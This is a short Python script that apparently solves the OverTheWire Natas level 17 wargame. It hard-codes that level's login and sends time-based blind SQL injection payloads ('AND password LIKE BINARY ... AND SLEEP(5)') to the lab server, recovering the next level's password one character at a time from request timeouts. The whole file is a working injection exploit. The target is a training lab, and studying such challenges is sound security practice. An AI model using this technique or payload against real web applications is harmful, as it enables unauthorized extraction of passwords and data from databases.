import requests
import sys
from string import digits, ascii_lowercase, ascii_uppercase

charset = ascii_lowercase + ascii_uppercase + digits
sqli_1 = 'natas18" AND password LIKE BINARY "'
sqli_2 = '" AND SLEEP(5)-- '

s = requests.Session()
s.auth = ('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')

password = ""
# We assume that the password is 32 chars 
while len(password) < 32:
    for char in charset:
        try:
            payload = {'username':sqli_1 + password + char + "%" + sqli_2}
            r = s.post('http://natas17.natas.labs.overthewire.org/', data=payload, timeout=1)
        except requests.Timeout:
            sys.stdout.write(char)
            sys.stdout.flush()
            password += char
            break
